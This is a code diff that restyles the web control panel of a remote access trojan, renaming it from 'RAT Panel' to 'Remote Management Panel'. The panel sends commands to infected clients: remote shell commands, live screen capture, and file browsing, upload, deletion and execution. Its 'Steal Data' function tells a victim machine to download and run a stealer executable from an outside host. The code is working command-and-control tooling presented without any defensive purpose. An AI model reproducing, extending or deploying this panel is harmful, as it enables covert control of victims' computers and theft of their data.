@@ -1,311 +1,764 @@
 <!DOCTYPE html>
-<html>
+<html lang="en">
 <head>
-  <meta charset="UTF-8" />
-  <title>RAT Panel</title>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Remote Management Panel</title>
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
-    body { 
-      font-family: sans-serif; 
+    :root {
+      --primary: #6c5ce7;
+      --primary-dark: #5649c5;
+      --secondary: #00cec9;
+      --danger: #ff7675;
+      --success: #00b894;
+      --warning: #fdcb6e;
+      --dark: #0f0c29;
+      --darker: #09071a;
+      --light: #f7f9fc;
+      --sidebar-bg: linear-gradient(180deg, #1e1b38 0%, #0f0c29 100%);
+      --card-bg: rgba(255, 255, 255, 0.08);
+      --card-bg-light: rgba(255, 255, 255, 0.15);
+      --transition: all 0.3s cubic-bezier(0.25, 0.8, 0.25, 1);
+    }
+
+    * {
       margin: 0;
       padding: 0;
+      box-sizing: border-box;
+      font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+    }
+
+    body {
+      background: linear-gradient(135deg, var(--dark), #302b63, #24243e);
+      color: var(--light);
+      min-height: 100vh;
+      overflow-x: hidden;
+    }
+
+    /* Layout */
+    .app-container {
       display: flex;
       min-height: 100vh;
     }
-    
-    /* Sidebar styles */
+
+    /* Sidebar */
     .sidebar {
-      width: 200px;
-      background-color: #2c3e50;
-      color: white;
-      padding: 1rem;
-      box-shadow: 2px 0 5px rgba(0,0,0,0.1);
+      width: 280px;
+      background: var(--sidebar-bg);
+      padding: 1.5rem;
+      box-shadow: 0 0 30px rgba(0, 0, 0, 0.4);
+      z-index: 10;
+      display: flex;
+      flex-direction: column;
     }
-    
-    .sidebar h1 {
-      font-size: 1.2rem;
+
+    .logo {
+      display: flex;
+      align-items: center;
+      margin-bottom: 2rem;
+      padding-bottom: 1.5rem;
+      border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .logo-icon {
+      width: 40px;
+      height: 40px;
+      background: linear-gradient(135deg, var(--primary), var(--secondary));
+      border-radius: 12px;
+      display: flex;
+      align-items: center;
+      justify-content: center;
+      margin-right: 12px;
+      box-shadow: 0 4px 20px rgba(108, 92, 231, 0.3);
+    }
+
+    .logo-text {
+      font-size: 1.5rem;
+      font-weight: 700;
+      background: linear-gradient(to right, #a29bfe, #74b9ff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .client-select-container {
+      position: relative;
       margin-bottom: 1.5rem;
-      padding-bottom: 1rem;
-      border-bottom: 1px solid #34495e;
     }
-    
-    .sidebar select {
+
+    .client-select-container::after {
+      content: "▼";
+      position: absolute;
+      right: 15px;
+      top: 50%;
+      transform: translateY(-50%);
+      color: #a29bfe;
+      pointer-events: none;
+    }
+
+    #clientList {
       width: 100%;
-      margin-bottom: 1.5rem;
-      background-color: #34495e;
-      color: white;
-      border: none;
-      padding: 0.5rem;
-      border-radius: 4px;
-    }
-    
-    /* Main content styles */
-    .main-content {
-      flex: 1;
-      padding: 2rem;
-    }
-    
-    /* Button styles */
-    .tab-button {
-      display: block;
-      width: 100%;
-      padding: 0.8rem;
-      margin-bottom: 0.8rem;
-      background-color: #3498db;
-      color: white;
-      border: none;
-      border-radius: 4px;
-      cursor: pointer;
+      padding: 12px 15px;
+      background: rgba(0, 0, 0, 0.2);
+      border: 1px solid rgba(108, 92, 231, 0.3);
+      border-radius: 12px;
+      color: var(--light);
       font-size: 1rem;
-      text-align: left;
-      transition: all 0.3s ease;
+      appearance: none;
+      outline: none;
+      transition: var(--transition);
+    }
+
+    #clientList:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.3);
+    }
+
+    .nav-tabs {
+      display: flex;
+      flex-direction: column;
+      gap: 0.8rem;
+    }
+
+    .tab-button {
+      display: flex;
+      align-items: center;
+      padding: 14px 20px;
+      background: var(--card-bg);
+      border: none;
+      border-radius: 12px;
+      color: var(--light);
+      font-size: 1rem;
+      font-weight: 500;
+      cursor: pointer;
+      transition: var(--transition);
       position: relative;
       overflow: hidden;
     }
-    
-    .tab-button:hover {
-      background-color: #2980b9;
-      transform: translateX(5px);
-    }
-    
-    .tab-button:active {
-      transform: scale(0.95);
-    }
-    
-    .tab-button::after {
+
+    .tab-button::before {
       content: '';
       position: absolute;
       top: 0;
       left: 0;
-      width: 100%;
-      height: 100%;
-      background: rgba(255,255,255,0.2);
-      transform: translateX(-100%);
-      transition: transform 0.3s ease;
-    }
-    
-    .tab-button:hover::after {
-      transform: translateX(0);
-    }
-    
-    /* Tab content styles */
-    select, input, button { margin: 0.5rem 0; padding: 0.4rem; font-size: 1rem; }
-    textarea, #explorer { width: 100%; margin-top: 1rem; font-family: monospace; }
-    textarea { height: 200px; }
-    img { margin-top: 1rem; border: 1px solid #ccc; max-width: 100%; }
-    .hidden { display: none; }
-    ul { list-style: none; padding-left: 0; }
-    li:hover { background-color: #eee; cursor: pointer; }
-    #contextMenu {
-      position: absolute;
-      display: none;
-      background: white;
-      border: 1px solid #ccc;
-      box-shadow: 2px 2px 6px rgba(0,0,0,0.1);
-      z-index: 1000;
-    }
-    #contextMenu div {
-      padding: 5px 10px;
-      cursor: pointer;
-    }
-    #contextMenu div:hover {
-      background: #eee;
-    }
-    pre {
-      background: #f5f5f5;
-      padding: 10px;
-      border-radius: 4px;
-      white-space: pre-wrap;
-      word-wrap: break-word;
-    }
-    .stealer-container {
-      display: flex;
-      gap: 1rem;
-      margin-top: 1rem;
-    }
-    .stealer-column {
-      flex: 1;
+      width: 5px;
+      height: 0;
+      background: var(--primary);
+      border-radius: 0 0 5px 0;
+      transition: height 0.3s ease;
     }
 
-    /* Dark theme styles */
-    body.dark {
-      background-color: #121212;
-      color: #f0f0f0;
+    .tab-button:hover {
+      background: var(--card-bg-light);
+      transform: translateX(5px);
     }
-    body.dark .sidebar {
-      background-color: #1a1a1a;
-      border-right: 1px solid #333;
+
+    .tab-button:hover::before {
+      height: 100%;
     }
-    body.dark .sidebar h1 {
-      border-bottom-color: #333;
-    }
-    body.dark .sidebar select {
-      background-color: #333;
-      color: #f0f0f0;
-    }
-    body.dark .tab-button {
-      background-color: #444;
-    }
-    body.dark .tab-button:hover {
-      background-color: #555;
-    }
-    body.dark textarea,
-    body.dark input,
-    body.dark select,
-    body.dark button,
-    body.dark #explorer,
-    body.dark #contextMenu,
-    body.dark pre {
-      background-color: #1e1e1e;
-      color: #f0f0f0;
-      border: 1px solid #444;
-    }
-    body.dark li:hover {
-      background-color: #333;
-    }
-    body.dark #contextMenu div:hover {
-      background: #444;
-    }
-    
-    /* Theme toggle button */
-    #themeToggle {
-      position: fixed;
-      top: 10px;
-      right: 10px;
+
+    .tab-button i {
+      margin-right: 12px;
       font-size: 1.2rem;
-      background: none;
+      width: 24px;
+      text-align: center;
+    }
+
+    .status-bar {
+      margin-top: auto;
+      padding-top: 1.5rem;
+      border-top: 1px solid rgba(255, 255, 255, 0.1);
+      display: flex;
+      flex-direction: column;
+      gap: 0.8rem;
+    }
+
+    .status-item {
+      display: flex;
+      justify-content: space-between;
+      font-size: 0.9rem;
+      color: rgba(255, 255, 255, 0.7);
+    }
+
+    .status-value {
+      color: var(--light);
+      font-weight: 500;
+    }
+
+    /* Main content */
+    .main-content {
+      flex: 1;
+      padding: 2rem;
+      overflow-y: auto;
+    }
+
+    .header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 2rem;
+    }
+
+    .header h1 {
+      font-size: 1.8rem;
+      font-weight: 700;
+      background: linear-gradient(to right, #a29bfe, #74b9ff);
+      -webkit-background-clip: text;
+      -webkit-text-fill-color: transparent;
+    }
+
+    .theme-toggle {
+      background: rgba(255, 255, 255, 0.1);
       border: none;
-      cursor: pointer;
-      z-index: 1000;
-      padding: 0.5rem;
+      width: 42px;
+      height: 42px;
       border-radius: 50%;
-      width: 40px;
-      height: 40px;
       display: flex;
       align-items: center;
       justify-content: center;
-      transition: all 0.3s ease;
-    }
-    
-    body:not(.dark) #themeToggle {
-      background-color: #f0f0f0;
-    }
-    
-    body.dark #themeToggle {
-      background-color: #333;
-    }
-    
-    #themeToggle:hover {
-      transform: rotate(30deg);
-    }
-    
-    /* Action buttons in tabs */
-    .action-button {
-      padding: 0.6rem 1rem;
-      background-color: #3498db;
-      color: white;
-      border: none;
-      border-radius: 4px;
       cursor: pointer;
+      transition: var(--transition);
+      color: var(--light);
+      font-size: 1.2rem;
+    }
+
+    .theme-toggle:hover {
+      background: rgba(255, 255, 255, 0.2);
+      transform: rotate(15deg);
+    }
+
+    /* Tab content */
+    .tab-content {
+      display: none;
+      animation: fadeIn 0.4s ease;
+    }
+
+    @keyframes fadeIn {
+      from { opacity: 0; transform: translateY(10px); }
+      to { opacity: 1; transform: translateY(0); }
+    }
+
+    .tab-content.active {
+      display: block;
+    }
+
+    .card {
+      background: var(--card-bg);
+      border-radius: 16px;
+      padding: 1.5rem;
+      margin-bottom: 1.5rem;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.05);
+      transition: var(--transition);
+    }
+
+    .card:hover {
+      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.3);
+      transform: translateY(-5px);
+    }
+
+    .card-header {
+      display: flex;
+      justify-content: space-between;
+      align-items: center;
+      margin-bottom: 1.5rem;
+    }
+
+    .card-title {
+      font-size: 1.3rem;
+      font-weight: 600;
+      color: var(--light);
+      display: flex;
+      align-items: center;
+    }
+
+    .card-title i {
+      margin-right: 10px;
+      color: var(--primary);
+    }
+
+    .action-buttons {
+      display: flex;
+      gap: 0.8rem;
+    }
+
+    .btn {
+      padding: 10px 20px;
+      border: none;
+      border-radius: 10px;
+      font-size: 0.95rem;
+      font-weight: 500;
+      cursor: pointer;
+      transition: var(--transition);
+      display: flex;
+      align-items: center;
+      justify-content: center;
+    }
+
+    .btn i {
+      margin-right: 8px;
+    }
+
+    .btn-primary {
+      background: linear-gradient(135deg, var(--primary), var(--primary-dark));
+      color: white;
+    }
+
+    .btn-primary:hover {
+      background: linear-gradient(135deg, var(--primary-dark), var(--primary));
+      box-shadow: 0 5px 15px rgba(108, 92, 231, 0.4);
+    }
+
+    .btn-danger {
+      background: linear-gradient(135deg, var(--danger), #e17055);
+      color: white;
+    }
+
+    .btn-danger:hover {
+      background: linear-gradient(135deg, #e17055, var(--danger));
+      box-shadow: 0 5px 15px rgba(255, 118, 117, 0.4);
+    }
+
+    .btn-success {
+      background: linear-gradient(135deg, var(--success), #00a884);
+      color: white;
+    }
+
+    .btn-success:hover {
+      background: linear-gradient(135deg, #00a884, var(--success));
+      box-shadow: 0 5px 15px rgba(0, 184, 148, 0.4);
+    }
+
+    .btn-warning {
+      background: linear-gradient(135deg, var(--warning), #f1c40f);
+      color: var(--darker);
+    }
+
+    .btn-warning:hover {
+      background: linear-gradient(135deg, #f1c40f, var(--warning));
+      box-shadow: 0 5px 15px rgba(253, 203, 110, 0.4);
+    }
+
+    /* Input styles */
+    .input-group {
+      margin-bottom: 1.5rem;
+    }
+
+    .input-group label {
+      display: block;
+      margin-bottom: 0.5rem;
+      font-weight: 500;
+      color: rgba(255, 255, 255, 0.8);
+    }
+
+    .input-field {
+      width: 100%;
+      padding: 14px;
+      background: rgba(0, 0, 0, 0.2);
+      border: 1px solid rgba(108, 92, 231, 0.3);
+      border-radius: 12px;
+      color: var(--light);
       font-size: 1rem;
-      transition: all 0.2s ease;
-      margin-right: 0.5rem;
+      transition: var(--transition);
     }
-    
-    .steal-button {
-      background-color: #e74c3c;
+
+    .input-field:focus {
+      border-color: var(--primary);
+      box-shadow: 0 0 0 3px rgba(108, 92, 231, 0.3);
+      outline: none;
     }
-    
-    .save-button {
-      background-color: #2ecc71;
+
+    /* Output console */
+    .output-console {
+      background: rgba(0, 0, 0, 0.3);
+      border-radius: 12px;
+      padding: 1.5rem;
+      font-family: 'Courier New', monospace;
+      font-size: 0.95rem;
+      color: rgba(255, 255, 255, 0.9);
+      height: 300px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      border: 1px solid rgba(255, 255, 255, 0.1);
     }
-    
-    .action-button:hover {
-      transform: translateY(-2px);
-      box-shadow: 0 2px 5px rgba(0,0,0,0.2);
+
+    /* Screenshot */
+    .screenshot-container {
+      position: relative;
+      margin-top: 1.5rem;
     }
-    
-    .action-button:active {
-      transform: translateY(0);
-      box-shadow: none;
+
+    #screenshot {
+      width: 100%;
+      border-radius: 12px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.3);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      transition: var(--transition);
     }
-    
-    .steal-button:hover {
-      background-color: #c0392b;
+
+    #screenshot:hover {
+      transform: scale(1.02);
+      box-shadow: 0 15px 40px rgba(0, 0, 0, 0.4);
     }
-    
-    .save-button:hover {
-      background-color: #27ae60;
+
+    /* File explorer */
+    .explorer-header {
+      display: flex;
+      align-items: center;
+      margin-bottom: 1.5rem;
+      background: rgba(0, 0, 0, 0.2);
+      padding: 0.8rem 1.2rem;
+      border-radius: 12px;
+      border: 1px solid rgba(108, 92, 231, 0.3);
+    }
+
+    #pathDisplay {
+      flex: 1;
+      font-family: monospace;
+      color: rgba(255, 255, 255, 0.9);
+      overflow: hidden;
+      text-overflow: ellipsis;
+      white-space: nowrap;
+    }
+
+    .file-list {
+      background: rgba(0, 0, 0, 0.2);
+      border-radius: 12px;
+      padding: 1rem;
+      max-height: 400px;
+      overflow-y: auto;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    .file-item {
+      display: flex;
+      align-items: center;
+      padding: 12px 15px;
+      border-radius: 8px;
+      margin-bottom: 0.5rem;
+      transition: var(--transition);
+      cursor: pointer;
+    }
+
+    .file-item:hover {
+      background: rgba(108, 92, 231, 0.2);
+    }
+
+    .file-item i {
+      margin-right: 12px;
+      font-size: 1.2rem;
+    }
+
+    .file-item.folder i {
+      color: #74b9ff;
+    }
+
+    .file-item.file i {
+      color: #a29bfe;
+    }
+
+    .file-name {
+      flex: 1;
+    }
+
+    .file-size {
+      color: rgba(255, 255, 255, 0.6);
+      font-size: 0.9rem;
+    }
+
+    /* Stealer */
+    .stealer-container {
+      display: flex;
+      flex-direction: column;
+      gap: 1.5rem;
+    }
+
+    #stealerData {
+      background: rgba(0, 0, 0, 0.3);
+      border-radius: 12px;
+      padding: 1.5rem;
+      font-family: 'Courier New', monospace;
+      font-size: 0.9rem;
+      color: rgba(255, 255, 255, 0.9);
+      height: 300px;
+      overflow-y: auto;
+      white-space: pre-wrap;
+      border: 1px solid rgba(255, 255, 255, 0.1);
+    }
+
+    /* Context menu */
+    #contextMenu {
+      position: absolute;
+      background: rgba(30, 30, 40, 0.95);
+      border-radius: 10px;
+      box-shadow: 0 10px 30px rgba(0, 0, 0, 0.4);
+      backdrop-filter: blur(10px);
+      border: 1px solid rgba(255, 255, 255, 0.1);
+      z-index: 1000;
+      display: none;
+      overflow: hidden;
+    }
+
+    #contextMenu div {
+      padding: 12px 20px;
+      font-size: 0.95rem;
+      color: rgba(255, 255, 255, 0.8);
+      cursor: pointer;
+      transition: var(--transition);
+      display: flex;
+      align-items: center;
+    }
+
+    #contextMenu div i {
+      margin-right: 10px;
+      width: 20px;
+      text-align: center;
+    }
+
+    #contextMenu div:hover {
+      background: rgba(108, 92, 231, 0.3);
+      color: var(--light);
+    }
+
+    /* Animations */
+    @keyframes pulse {
+      0% { box-shadow: 0 0 0 0 rgba(108, 92, 231, 0.7); }
+      70% { box-shadow: 0 0 0 10px rgba(108, 92, 231, 0); }
+      100% { box-shadow: 0 0 0 0 rgba(108, 92, 231, 0); }
+    }
+
+    .pulse {
+      animation: pulse 2s infinite;
+    }
+
+    /* Responsive */
+    @media (max-width: 992px) {
+      .app-container {
+        flex-direction: column;
+      }
+      
+      .sidebar {
+        width: 100%;
+      }
     }
   </style>
 </head>
 <body>
-  <button id="themeToggle" title="Toggle theme">
-    🌙
-  </button>
-  
-  <!-- Sidebar -->
-  <div class="sidebar">
-    <h1>Connected Clients</h1>
-    <select id="clientList"></select>
+  <div class="app-container">
     
-    <button class="tab-button" onclick="showTab('cmd')">CMD</button>
-    <button class="tab-button" onclick="showTab('screen')">Screen</button>
-    <button class="tab-button" onclick="showTab('explorer')">Explorer</button>
-    <button class="tab-button" onclick="showTab('stealer')">Stealer</button>
-  </div>
-  
-  <!-- Main content -->
-  <div class="main-content">
-    <div id="cmdTab">
-      <h2>Command Execution</h2>
-      <input id="cmdInput" placeholder="Enter command..." />
-      <button class="action-button" onclick="sendCommand()">Send CMD</button>
-      <textarea id="output" readonly></textarea>
-    </div>
-
-    <div id="screenTab" class="hidden">
-      <h2>Live Screen</h2>
-      <button class="action-button" onclick="startScreen()">Start Screen</button>
-      <button class="action-button" onclick="stopScreen()">Stop Screen</button>
-      <img id="screenshot" src="" />
-    </div>
-
-    <div id="explorerTab" class="hidden">
-      <h2>File Explorer</h2>
-      <div id="pathDisplay" style="margin-bottom: 0.5rem; font-family: monospace;"></div>
-      <input type="file" id="uploadInput" />
-      <progress id="uploadProgress" value="0" max="100" style="width:100%; display:none;"></progress>
-      <button class="action-button" onclick="upload()">Upload</button>
-      <div id="explorer"></div>
-    </div>
-
-    <div id="stealerTab" class="hidden">
-      <h2>Data Stealer</h2>
-      <button class="action-button steal-button" onclick="stealData()">Steal Data</button>
-      <pre id="stealerStatus"></pre>
-      <div class="stealer-container">
-        <div class="stealer-column">
-          <h3>Status</h3>
-        <pre id="stealerData">No data</pre>
+    <div class="sidebar">
+      <div class="logo">
+        <div class="logo-icon">⚙️</div>
+        <div class="logo-text">Remote Panel</div>
+      </div>
+      
+      <div class="client-select-container">
+        <select id="clientList"></select>
+      </div>
+      
+      <div class="nav-tabs">
+        <button class="tab-button" onclick="showTab('cmd')">
+          <i class="fas fa-terminal"></i> Command Terminal
+        </button>
+        <button class="tab-button" onclick="showTab('screen')">
+          <i class="fas fa-desktop"></i> Screen Capture
+        </button>
+        <button class="tab-button" onclick="showTab('explorer')">
+          <i class="fas fa-folder"></i> File Explorer
+        </button>
+        <button class="tab-button" onclick="showTab('stealer')">
+          <i class="fas fa-search"></i> Data Stealer
+        </button>
+      </div>
+      
+      <div class="status-bar">
+        <div class="status-item">
+          <span>Active Clients:</span>
+          <span class="status-value" id="activeClients">0</span>
+        </div>
+        <div class="status-item">
+          <span>Uptime:</span>
+          <span class="status-value" id="uptime">0s</span>
+        </div>
       </div>
     </div>
+    
+    
+    <div class="main-content">
+      <div class="header">
+        <h1>Remote Management Panel</h1>
+        <button class="theme-toggle" id="themeToggle">🌙</button>
+      </div>
+      
+      
+      <div id="cmdTab" class="tab-content active">
+        <div class="card">
+          <div class="card-header">
+            <h2 class="card-title"><i class="fas fa-terminal"></i> Command Execution</h2>
+          </div>
+          
+          <div class="input-group">
+            <input type="text" id="cmdInput" class="input-field" placeholder="Enter command..." onkeypress="if(event.keyCode==13) sendCommand()">
+          </div>
+          
+          <button class="btn btn-primary" onclick="sendCommand()">
+            <i class="fas fa-paper-plane"></i> Send CMD
+          </button>
+        </div>
+        
+        <div class="card">
+          <div class="card-header">
+            <h2 class="card-title"><i class="fas fa-file-alt"></i> Command Output</h2>
+          </div>
+          
+          <div class="output-console" id="output">
+[System] Waiting for clients...
+          </div>
+        </div>
+      </div>
+      
+      
+      <div id="screenTab" class="tab-content">
+        <div class="card">
+          <div class="card-header">
+            <h2 class="card-title"><i class="fas fa-desktop"></i> Live Screen</h2>
+            <div class="action-buttons">
+              <button class="btn btn-primary" onclick="startScreen()">
+                <i class="fas fa-play"></i> Start Screen
+              </button>
+              <button class="btn btn-danger" onclick="stopScreen()">
+                <i class="fas fa-stop"></i> Stop Screen
+              </button>
+            </div>
+          </div>
+          
+          <div class="screenshot-container">
+            <img id="screenshot" src="" alt="Remote screen">
+          </div>
+        </div>
+      </div>
+      
+      
+      <div id="explorerTab" class="tab-content">
+        <div class="card">
+          <div class="card-header">
+            <h2 class="card-title"><i class="fas fa-folder"></i> File Explorer</h2>
+            <div class="action-buttons">
+              <input type="file" id="uploadInput" style="display: none;" />
+              <button class="btn btn-success" onclick="document.getElementById('uploadInput').click()">
+                <i class="fas fa-upload"></i> Upload
+              </button>
+              <progress id="uploadProgress" value="0" max="100" style="width:120px; display:none;"></progress>
+            </div>
+          </div>
+          
+          <div class="explorer-header">
+            <div id="pathDisplay">C:\</div>
+          </div>
+          
+          <div class="file-list" id="explorer">
+            <div class="file-item">
+              <i class="fas fa-folder"></i>
+              <div class="file-name">Loading files...</div>
+            </div>
+          </div>
+        </div>
+      </div>
+      
+      
+      <div id="stealerTab" class="tab-content">
+        <div class="card">
+          <div class="card-header">
+            <h2 class="card-title"><i class="fas fa-search"></i> Data Stealer</h2>
+            <div class="action-buttons">
+              <button class="btn btn-warning" onclick="stealData()">
+                <i class="fas fa-bolt"></i> Steal Data
+              </button>
+              <button class="btn btn-success" id="downloadBtn" style="display: none;">
+                <i class="fas fa-download"></i> Download
+              </button>
+            </div>
+          </div>
+          
+          <div class="stealer-container">
+            <div class="input-group">
+              <label>Status:</label>
+              <div class="output-console" id="stealerStatus">
+[System] Ready to extract data
+              </div>
+            </div>
+            
+            <div class="input-group">
+              <label>Extracted Data:</label>
+              <div class="output-console" id="stealerData">
+No data extracted yet. Start extraction to see results.
+              </div>
+            </div>
+          </div>
+        </div>
       </div>
     </div>
   </div>
 
   <div id="contextMenu">
-    <div onclick="deleteFile()">Delete</div>
-    <div onclick="openFile()">Run</div>
+    <div onclick="deleteFile()"><i class="fas fa-trash"></i> Delete</div>
+    <div onclick="openFile()"><i class="fas fa-play"></i> Run</div>
+    <div onclick="downloadFile()"><i class="fas fa-download"></i> Download</div>
   </div>
 
   <script>
     let selectedClient = "";
     let currentPath = "C:\\\\";
     let rightClickedPath = "";
-
+    let startTime = Date.now();
+    
     const output = document.getElementById("output");
     const explorer = document.getElementById("explorer");
-
+    const downloadBtn = document.getElementById("downloadBtn");
+    
+    // Initialize UI
+    function initUI() {
+      loadClients();
+      showTab('cmd');
+      updateUptime();
+      
+      // Theme toggle event
+      themeToggle.onclick = () => {
+        const isDark = !document.body.classList.contains("dark");
+        applyTheme(isDark);
+      };
+      
+      // Download button event
+      downloadBtn.onclick = downloadStealerData;
+      
+      // File upload event
+      document.getElementById('uploadInput').addEventListener('change', upload);
+      
+      // Hide context menu when clicking elsewhere
+      window.onclick = hideContextMenu;
+    }
+    
+    // Apply theme
+    function applyTheme(isDark) {
+      document.body.classList.toggle("dark", isDark);
+      themeToggle.textContent = isDark ? "☀️" : "🌙";
+      localStorage.setItem("theme", isDark ? "dark" : "light");
+    }
+    
+    // Update uptime counter
+    function updateUptime() {
+      const uptimeEl = document.getElementById("uptime");
+      const elapsed = Math.floor((Date.now() - startTime) / 1000);
+      const hours = Math.floor(elapsed / 3600);
+      const minutes = Math.floor((elapsed % 3600) / 60);
+      const seconds = elapsed % 60;
+      
+      uptimeEl.textContent = `${hours}h ${minutes}m ${seconds}s`;
+      setTimeout(updateUptime, 1000);
+    }
+    
+    // Load clients
     function loadClients() {
       fetch("/clients")
         .then(res => res.json())
@@ -318,18 +771,48 @@
             opt.textContent = id;
             list.appendChild(opt);
           });
-          if (data.length) selectedClient = data[0];
+          
+          if (data.length) {
+            selectedClient = data[0];
+            document.getElementById("activeClients").textContent = data.length;
+          }
+          
+          output.value += `[System] ${data.length} clients connected\n`;
+        })
+        .catch(() => {
+          output.value += `[System] Error loading clients\n`;
         });
     }
-
-    document.getElementById("clientList").addEventListener("change", (e) => {
-      selectedClient = e.target.value;
-    });
-
+    
+    // Show tab
+    function showTab(tab) {
+      // Hide all tabs
+      document.querySelectorAll(".tab-content").forEach(tab => {
+        tab.classList.remove("active");
+      });
+      
+      // Show selected tab
+      document.getElementById(`${tab}Tab`).classList.add("active");
+      
+      // Highlight active button
+      document.querySelectorAll(".tab-button").forEach(btn => {
+        btn.classList.remove("active");
+      });
+      
+      // Add active class to clicked button
+      event.target.classList.add("active");
+      
+      // Load explorer if needed
+      if (tab === "explorer") {
+        sendLs(currentPath);
+      }
+    }
+    
+    // Send command
     function sendCommand() {
       const cmd = document.getElementById("cmdInput").value;
       if (!selectedClient || !cmd) return;
-
+      
       fetch(`/send/${selectedClient}`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
@@ -340,112 +823,142 @@
         } else {
           output.value += `[!!] Failed to send command\n`;
         }
+        output.scrollTop = output.scrollHeight;
       });
+      
+      document.getElementById("cmdInput").value = "";
     }
-
+    
+    // Screen functions
     function startScreen() {
       if (!selectedClient) return;
+      
+      const status = document.getElementById("stealerStatus");
+      status.textContent = `[Screen] Starting screen capture for ${selectedClient}...`;
+      
       fetch(`/send/${selectedClient}`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ type: "start_screen", data: "" })
       });
     }
-
+    
     function stopScreen() {
       if (!selectedClient) return;
+      
+      const status = document.getElementById("stealerStatus");
+      status.textContent += `\n[Screen] Stopping capture...`;
+      
       fetch(`/send/${selectedClient}`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ type: "stop_screen", data: "" })
       });
     }
-
-    function showTab(tab) {
-      ["cmdTab", "screenTab", "explorerTab", "stealerTab"].forEach(id => {
-        document.getElementById(id).classList.add("hidden");
+    
+    // Steal data
+    function stealData() {
+      const status = document.getElementById("stealerStatus");
+      status.textContent = `[Stealer] Starting data extraction from ${selectedClient}...`;
+      
+      fetch(`/send/${selectedClient}`, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({
+          type: "run_stealer",
+          data: "https://panel-agzz.onrender.com/apps/steller.exe"
+        })
+      })
+      .then(() => {
+        status.textContent = "Stealer activated successfully!";
+      })
+      .catch(err => {
+        status.textContent = "Error: " + err.message;
       });
-      document.getElementById(tab + "Tab").classList.remove("hidden");
-
-      if (tab === "explorer") {
-        sendLs(currentPath);
-      }
     }
-
+    
+    // Download stealer data
+    function downloadStealerData() {
+      const data = document.getElementById("stealerData").textContent;
+      const blob = new Blob([data], { type: 'text/plain' });
+      const url = URL.createObjectURL(blob);
+      const a = document.createElement('a');
+      
+      a.href = url;
+      a.download = `extracted_data_${new Date().toISOString().slice(0, 10)}.txt`;
+      document.body.appendChild(a);
+      a.click();
+      
+      setTimeout(() => {
+        document.body.removeChild(a);
+        window.URL.revokeObjectURL(url);
+      }, 100);
+    }
+    
+    // Send ls command
     function sendLs(path) {
       if (!selectedClient) return;
+      
       fetch(`/send/${selectedClient}`, {
         method: "POST",
         headers: { "Content-Type": "application/json" },
         body: JSON.stringify({ type: "ls", data: path })
       });
     }
-
-    function deleteFile() {
-      hideContextMenu();
-      if (!selectedClient || !rightClickedPath) return;
-      fetch(`/send/${selectedClient}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ type: "rm", data: rightClickedPath })
-      }).then(() => {
-        sendLs(currentPath);
-      });
-    }
-
-    function openFile() {
-      hideContextMenu();
-      if (!selectedClient || !rightClickedPath) return;
-      fetch(`/send/${selectedClient}`, {
-        method: "POST",
-        headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ type: "open", data: rightClickedPath })
-      }).then(() => {
-        sendLs(currentPath);
-      });
-    }
-
+    
+    // Render explorer
     function renderExplorer(list) {
       explorer.innerHTML = "";
-      const ul = document.createElement("ul");
       document.getElementById("pathDisplay").textContent = currentPath;
-
+      
       if (list.parent) {
-        const liUp = document.createElement("li");
-        liUp.textContent = "..";
+        const liUp = document.createElement("div");
+        liUp.className = "file-item folder";
+        liUp.innerHTML = `<i class="fas fa-folder"></i><div class="file-name">..</div>`;
         liUp.onclick = () => {
           currentPath = list.parent;
           sendLs(currentPath);
         };
-        ul.appendChild(liUp);
+        explorer.appendChild(liUp);
       }
-
+      
       list.items.forEach(item => {
-        const li = document.createElement("li");
-        li.textContent = item.name;
+        const li = document.createElement("div");
+        li.className = `file-item ${item.dir ? 'folder' : 'file'}`;
+        li.innerHTML = `
+          <i class="${item.dir ? 'fas fa-folder' : 'fas fa-file'}"></i>
+          <div class="file-name">${item.name}</div>
+          <div class="file-size">${item.dir ? 'Folder' : 'File'}</div>
+        `;
+        
         li.oncontextmenu = (e) => {
           e.preventDefault();
           rightClickedPath = item.full;
           showContextMenu(e.pageX, e.pageY);
         };
+        
         if (item.dir) {
-          li.style.fontWeight = "bold";
           li.onclick = () => {
             currentPath = item.full;
             sendLs(currentPath);
           };
         }
-        ul.appendChild(li);
+        
+        explorer.appendChild(li);
       });
-
-      explorer.appendChild(ul);
     }
-
+    
+    // Upload file
     function upload() {
       const file = document.getElementById("uploadInput").files[0];
       const progress = document.getElementById("uploadProgress");
+      const status = document.getElementById("stealerStatus");
+      
       if (!file || !selectedClient) return;
-
+      
+      status.textContent = `[File] Uploading ${file.name} to ${currentPath}...`;
+      progress.style.display = 'block';
+      
       const reader = new FileReader();
       reader.onload = function() {
         const base64Data = reader.result.split(",")[1];
@@ -454,7 +967,6 @@
           content: base64Data
         };
 
-        progress.style.display = "block";
         progress.value = 0;
 
         fetch(`/send/${selectedClient}`, {
@@ -464,14 +976,14 @@
         }).then(res => {
           progress.style.display = "none";
           if (res.ok) {
-            output.value += `[-> ${selectedClient}] Uploaded ${file.name} to ${currentPath}\n`;
+            status.textContent += `\n[File] Upload completed successfully!`;
             sendLs(currentPath);
           } else {
-            output.value += `[!!] Failed to send upload\n`;
+            status.textContent += `\n[!!] Failed to upload file`;
           }
         }).catch(error => {
           progress.style.display = "none";
